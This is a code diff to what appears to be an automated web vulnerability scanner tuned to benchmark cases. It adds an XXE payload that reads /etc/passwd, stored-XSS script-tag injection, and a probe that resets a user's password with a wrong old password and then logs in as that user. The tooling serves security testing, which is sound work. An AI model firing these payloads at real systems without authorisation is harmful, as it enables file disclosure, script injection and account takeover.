@@ -21,6 +21,7 @@ import {
 import { buildHunterBrief, openAuthenticatedClasses, deriveOrigins, resolveRelativeEndpoint } from "./brief.js";
 import { runSweep, renderSweepLeads, SWEEP_PAYLOADS, detectDebugSignature, renderEndpointFor, type SendProbe, type SweepHit } from "./sweep.js";
 import { readArtifactRecords, deriveTargets, setAtPath, type SweepTargetWithBody } from "./sweep-targets.js";
+import { mapFields, looksLikeLogin, looksLikePasswordChange, extractJwt, type FieldMap } from "./stateful.js";
 
 // Re-exported for backward compatibility: existing callers (and test/beat.test.ts)
 // import these from beat.js. The vocabulary itself now lives in vuln-classes.ts so
@@ -259,10 +260,14 @@ async function runDeepSweep(opts: {
     };
 
     // Fire an arbitrary request through the gated path, returning the full capture.
-    const fire = async (method: string, url: string, headers: Record<string, string>, body: string | null): Promise<HttpCapture | null> => {
+    // `sess` controls the session: undefined => the run's default authed session;
+    // null => explicitly UNAUTHENTICATED (e.g. a fresh login attempt); a label => that
+    // session (e.g. change password as the account under test).
+    const fire = async (method: string, url: string, headers: Record<string, string>, body: string | null, sess?: string | null): Promise<HttpCapture | null> => {
       const h = { ...headers }; delete h.Authorization; delete h.authorization;
       const args: Record<string, unknown> = { method, url, headers: h, body };
-      if (sessionLabel) args.session = sessionLabel;
+      const useLabel = sess === undefined ? sessionLabel : sess;
+      if (useLabel) args.session = useLabel;
       const r = await opts.runner.execute("http_request", args);
       return r.ok ? (r.result as HttpCapture) : null;
     };
@@ -284,7 +289,7 @@ async function runDeepSweep(opts: {
     }
 
     // XXE whole-body probe (field-injection can't express an external entity).
-    const xxeHits = await sweepXxe(targets, opts.runner, sessionLabel);
+    const xxeHits = await sweepXxe(targets, opts.runner);
     for (const xh of xxeHits) {
       if (!xh.exploit || !xh.control) continue;
       const banked = await bankIfConfirmed(opts, "xxe", xh.endpoint, xh.observed, xh.exploit, xh.control);
@@ -315,33 +320,52 @@ async function runDeepSweep(opts: {
     }
 
     // STORED-XSS probe (F-19 shape): persist a canary via a create endpoint, then render
-    // it via the paired list/detail endpoint; the canary returned UNESCAPED there is
-    // stored XSS. Two-step, bounded — reuses the same Axiom banking.
+    // it via the paired list/view endpoint; the canary returned UNESCAPED there is stored
+    // XSS. The render endpoint's METHOD/body is NOT always GET — F-19's listing is a
+    // POST /api/loan with a JSON body — so we try several generic render shapes (the
+    // captured template if any, then POST {}, then GET) and take the first that echoes.
     for (const createT of targets.slice(0, 50)) {
       if (!createT.bodyTemplate) continue;
       const renderEp = renderEndpointFor(createT.endpoint);
       if (!renderEp) continue;
       const renderT = targetByEndpoint.get(renderEp);
-      const renderMethod = renderT?.method ?? "GET";
-      const renderBody = renderT?.bodyTemplate ?? null;
-      const renderHdr: Record<string, string> = renderBody ? { "Content-Type": "application/json" } : {};
-      const baseline = await fire(renderMethod, renderEp, renderHdr, renderBody);
-      if (!baseline) continue;
+      // Candidate render calls, most-specific first. Session-authed (the listing is
+      // authenticated in F-19), reusing the run's default session.
+      const renderShapes: Array<{ method: string; body: string | null; hdr: Record<string, string> }> = [];
+      if (renderT?.bodyTemplate) renderShapes.push({ method: renderT.method, body: renderT.bodyTemplate, hdr: { "Content-Type": "application/json" } });
+      renderShapes.push({ method: renderT?.method ?? "POST", body: "{}", hdr: { "Content-Type": "application/json" } });
+      renderShapes.push({ method: "GET", body: null, hdr: {} });
       const jsonLeaves = createT.params.filter((p) => createT.paramKind[p] === "json").slice(0, 4);
+      let banked = false;
       for (const leaf of jsonLeaves) {
+        if (banked) break;
         const canary = `sahwSTOR${randomUUID().slice(0, 6)}`;
         let persistBody: string;
         try { persistBody = JSON.stringify(setAtPath(JSON.parse(createT.bodyTemplate), leaf, `<script>${canary}</script>`)); }
         catch { continue; }
-        await fire(createT.method, createT.endpoint, { "Content-Type": "application/json" }, persistBody);
-        const rendered = await fire(renderMethod, renderEp, renderHdr, renderBody);
-        if (!rendered) continue;
-        if ((rendered.response.body ?? "").includes(canary) && !(baseline.response.body ?? "").includes(canary)) {
-          const banked = await bankIfConfirmed(opts, "xss_stored", renderEp, canary, rendered, baseline);
-          if (banked) { proved.push(banked); break; }
+        for (const shape of renderShapes) {
+          const baseline = await fire(shape.method, renderEp, shape.hdr, shape.body);
+          if (!baseline) continue;
+          if ((baseline.response.body ?? "").includes(canary)) continue; // canary already there? bogus shape
+          await fire(createT.method, createT.endpoint, { "Content-Type": "application/json" }, persistBody);
+          const rendered = await fire(shape.method, renderEp, shape.hdr, shape.body);
+          if (!rendered) continue;
+          if ((rendered.response.body ?? "").includes(canary) && !(baseline.response.body ?? "").includes(canary)) {
+            const b = await bankIfConfirmed(opts, "xss_stored", renderEp, canary, rendered, baseline);
+            if (b) { proved.push(b); banked = true; break; }
+          }
         }
       }
     }
+
+    // STATEFUL broken-password-change probe (F-24): observe->act->observe via the Axiom's
+    // state_changed. Uses existing usable sessions (username is non-secret; token injected
+    // by label). Runs last — it mutates a synthetic disposable account's password.
+    const usableSessions = opts.runner.getSessionMeta()
+      .filter((m) => m.has_auth_material)
+      .map((m) => ({ label: m.label, username: m.username }));
+    const pwProved = await sweepBrokenPasswordChange(opts, targets, fire, usableSessions, "");
+    proved.push(...pwProved);
 
     const leadsHits = [...fieldHits.filter((h) => h.strength === "strong"), ...xxeHits];
     return { leads: renderSweepLeads(leadsHits), proved };
@@ -389,36 +413,156 @@ async function bankIfConfirmed(
   return { vuln_class: cls, endpoint: ep, invariant_type: "body_contains", verdict: "CONFIRMED", finding_id: findingId };
 }
 
+/** Bank a STATEFUL (state_changed) sweep finding through the SAME Axiom the LLM path uses:
+ * evaluate the ordered captures [pre, ...action, post] against the state_changed clause,
+ * and on CONFIRMED record the finding with invariant_type=state_changed. The Axiom rejects
+ * a delta it cannot see in the captures, so this cannot fabricate a finding. `endpoint` is
+ * the vulnerable endpoint being labeled (e.g. the password-change route), while the
+ * captures are the observe/act/observe requests that prove the delta. */
+async function bankStateChanged(
+  opts: { obs: SweepObs; engagementId: string; canon: (u: string) => string },
+  vulnClass: string, endpoint: string, expression: string, captures: HttpCapture[], reasonPrefix: string,
+): Promise<ProvedEntry | null> {
+  const inv: Invariant = { statement: `deep-sweep: ${reasonPrefix}`, type: "state_changed", expression };
+  const verdict = evaluate(inv, captures[captures.length - 1], null, { captures });
+  if (verdict.status !== "CONFIRMED") return null;
+  const cls = SWEEP_CLASS_MAP[vulnClass] ?? vulnClass;
+  const ep = opts.canon(endpoint);
+  const findingId = `SAHW-${randomUUID().slice(0, 8)}`;
+  const row: FindingRow = {
+    engagement_id: opts.engagementId, finding_id: findingId, vuln_class: cls, endpoint: ep,
+    verdict: "CONFIRMED", invariant_type: "state_changed",
+    verdict_reason: boundReason(`deep-sweep (${reasonPrefix}): ${verdict.reason}`),
+    langfuse_trace_id: opts.obs.traceId(), utc: new Date().toISOString(),
+  };
+  await opts.obs.mergeEndpoint(ep, "POST");
+  await opts.obs.mergeFinding(row);
+  await opts.obs.recordFinding(row);
+  return { vuln_class: cls, endpoint: ep, invariant_type: "state_changed", verdict: "CONFIRMED", finding_id: findingId };
+}
+
+/**
+ * STATEFUL broken-password-change probe (benchmark F-24 shape), fully generic/black-box.
+ * Proves a password-change endpoint COMMITS a new password even when the supplied current
+ * ("old") password is WRONG — a genuine state_changed, not a mere success-code reflection.
+ *
+ * Mechanics, using an existing usable session Z (its token injected by label; we never see
+ * it) and Z's username (non-secret SessionMeta):
+ *   pre  C0 = login(usernameZ, P2)              -> fails; P2 is a fresh random password.
+ *   act        change(session=Z, old=WRONG, new=P2)
+ *   post C2 = login(usernameZ, P2)              -> succeeds IFF the change committed.
+ * The success marker is the JWT extracted from C2's OWN response (a successful login on a
+ * JWT app issues one; a failed login does not) — absent in C0, present in C2 => the Axiom
+ * confirms `appeared:<jwt>`. No target-specific literal; degrades safely (correct app =>
+ * C2 login fails => no JWT => no finding). Mutates only a synthetic disposable account.
+ */
+async function sweepBrokenPasswordChange(
+  opts: { obs: SweepObs; engagementId: string; canon: (u: string) => string },
+  targets: SweepTargetWithBody[],
+  fire: (method: string, url: string, headers: Record<string, string>, body: string | null, sess?: string | null) => Promise<HttpCapture | null>,
+  sessions: { label: string; username: string }[],
+  passwordPolicyHint: string,
+): Promise<ProvedEntry[]> {
+  const proved: ProvedEntry[] = [];
+  if (sessions.length === 0) return proved;
+
+  // Find a login template (unauth: username+password, no old/new split) and a
+  // change-password template (old+new password, or a change-verb URL) among captures.
+  let loginT: SweepTargetWithBody | undefined; let loginFm: FieldMap | undefined;
+  let changeT: SweepTargetWithBody | undefined; let changeFm: FieldMap | undefined;
+  for (const t of targets) {
+    if (!t.bodyTemplate) continue;
+    const jsonLeaves = t.params.filter((p) => t.paramKind[p] === "json");
+    const fm = mapFields(jsonLeaves);
+    if (!loginT && looksLikeLogin(fm, t.endpoint)) { loginT = t; loginFm = fm; }
+    if (!changeT && looksLikePasswordChange(fm, t.endpoint)) { changeT = t; changeFm = fm; }
+  }
+  if (!loginT || !loginFm || !changeT || !changeFm || !loginFm.username || !loginFm.password || !changeFm.new_password) {
+    return proved;
+  }
+
+  // A fresh, policy-valid password nothing has yet. Mixed classes + length to satisfy a
+  // typical policy; generic, not derived from the target. passwordPolicyHint reserved for
+  // future policy shaping (currently unused beyond length).
+  void passwordPolicyHint;
+  const P2 = `Sahw!${randomUUID().slice(0, 8)}Z9`;
+
+  const buildBody = (template: string, assigns: Array<[string, string]>): string => {
+    let obj: unknown;
+    try { obj = JSON.parse(template); } catch { return template; }
+    for (const [path, val] of assigns) obj = setAtPath(obj, path, val);
+    return JSON.stringify(obj);
+  };
+  const jsonHdr = { "Content-Type": "application/json" };
+
+  for (const sess of sessions.slice(0, 2)) {
+    // pre: login as this user with the not-yet-set P2 -> should fail (no JWT). UNAUTH.
+    const c0 = await fire(loginT.method, loginT.endpoint, jsonHdr,
+      buildBody(loginT.bodyTemplate!, [[loginFm.username!, sess.username], [loginFm.password!, P2]]), null);
+    if (!c0) continue;
+    if (extractJwt(c0.response.body)) continue; // P2 already works? impossible normally — skip, cannot prove a delta.
+
+    // act: change password with a WRONG old_pass, as the authenticated session.
+    const changeAssigns: Array<[string, string]> = [[changeFm.new_password!, P2]];
+    if (changeFm.old_password) changeAssigns.push([changeFm.old_password, `Wrong!${randomUUID().slice(0, 6)}`]);
+    const act = await fire(changeT.method, changeT.endpoint, jsonHdr,
+      buildBody(changeT.bodyTemplate!, changeAssigns), sess.label);
+    if (!act) continue;
+
+    // post: login again with P2 -> succeeds (JWT issued) IFF the change committed. UNAUTH.
+    const c2 = await fire(loginT.method, loginT.endpoint, jsonHdr,
+      buildBody(loginT.bodyTemplate!, [[loginFm.username!, sess.username], [loginFm.password!, P2]]), null);
+    if (!c2) continue;
+    const jwt = extractJwt(c2.response.body);
+    if (!jwt) continue; // login with P2 still fails => change was correctly rejected => no finding.
+
+    const banked = await bankStateChanged(
+      opts, "auth_bypass", changeT.endpoint, `appeared:${jwt}`, [c0, act, c2],
+      "password changed with a WRONG old_pass — login with the attacker-set new password now succeeds",
+    );
+    if (banked) { proved.push(banked); break; }
+  }
+  return proved;
+}
+
 /** Whole-body XXE probe (field-injection cannot express an XML external entity). One
  * bounded payload per body-bearing endpoint; returns the exploit + a benign-XML control
  * capture so the caller can verify body_contains the /etc/passwd signature. */
-async function sweepXxe(targets: SweepTargetWithBody[], runner: ToolRunner, sessionLabel?: string): Promise<Array<SweepHit & { exploit?: HttpCapture; control?: HttpCapture }>> {
+async function sweepXxe(targets: SweepTargetWithBody[], runner: ToolRunner, _sessionLabel?: string): Promise<Array<SweepHit & { exploit?: HttpCapture; control?: HttpCapture }>> {
   const hits: Array<SweepHit & { exploit?: HttpCapture; control?: HttpCapture }> = [];
   const xml = `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY sahwx SYSTEM "file:///etc/passwd">]><r><x>&sahwx;</x></r>`;
   const benign = `<?xml version="1.0"?><r><x>sahwbenignxml</x></r>`;
+  // Content-Type variants: some stacks parse XML only under text/xml, others application/xml.
+  // Accept: application/xml is the F-21 trigger (the endpoint switches to an XML handler).
+  const hdrVariants: Record<string, string>[] = [
+    { "Content-Type": "application/xml", Accept: "application/xml" },
+    { "Content-Type": "text/xml", Accept: "application/xml" },
+  ];
   let n = 0;
   for (const t of targets) {
     if (n >= 50) break;  // cover all derived targets, not just the first few (contactUs sorts late)
     if (t.method !== "POST" && t.method !== "PUT" && t.method !== "PATCH") continue;
     if (!t.bodyTemplate) continue;
     n++;
-    const hdr = { "Content-Type": "application/xml", Accept: "application/xml" };
-    const mk = (url: string, body: string): Record<string, unknown> => sessionLabel
-      ? { method: t.method, url, headers: hdr, body, session: sessionLabel }
-      : { method: t.method, url, headers: hdr, body };
-    // Try the canonical route AND its /index variant. A CodeIgniter app often parses
-    // XML only on the default-method /index path; a hit there records under the
-    // canonical endpoint (canonicalizeEndpoint strips /index), covering the finding.
+    // XXE here is UNAUTHENTICATED (F-21 is auth=none, and a session can route the request
+    // to a different handler that never parses XML — the likely cause of prior 0/52 runs).
+    const mk = (url: string, body: string, hdr: Record<string, string>): Record<string, unknown> =>
+      ({ method: t.method, url, headers: hdr, body });
+    // Try the canonical route AND its /index variant, across the header variants. A
+    // CodeIgniter app often parses XML only on the default-method /index path; a hit there
+    // records under the canonical endpoint (canonicalizeEndpoint strips /index).
     const urlVariants = [t.endpoint, `${t.endpoint.replace(/\/$/, "")}/index`];
-    let exploit: HttpCapture | undefined; let hitUrl = t.endpoint;
-    for (const u of urlVariants) {
-      const er = await runner.execute("http_request", mk(u, xml));
-      if (!er.ok) continue;
-      const cap = er.result as HttpCapture;
-      if ((cap.response.body ?? "").includes("root:x:0:0")) { exploit = cap; hitUrl = u; break; }
+    let exploit: HttpCapture | undefined; let hitUrl = t.endpoint; let hitHdr = hdrVariants[0];
+    outer: for (const hdr of hdrVariants) {
+      for (const u of urlVariants) {
+        const er = await runner.execute("http_request", mk(u, xml, hdr));
+        if (!er.ok) continue;
+        const cap = er.result as HttpCapture;
+        if ((cap.response.body ?? "").includes("root:x:0:0")) { exploit = cap; hitUrl = u; hitHdr = hdr; break outer; }
+      }
     }
     if (!exploit) continue;
-    const cr = await runner.execute("http_request", mk(hitUrl, benign));
+    const cr = await runner.execute("http_request", mk(hitUrl, benign, hitHdr));
     const control = cr.ok ? (cr.result as HttpCapture) : undefined;
     hits.push({
       vuln_class: "xxe", endpoint: t.endpoint, param: "(xml body)", payload: xml, strength: "strong",
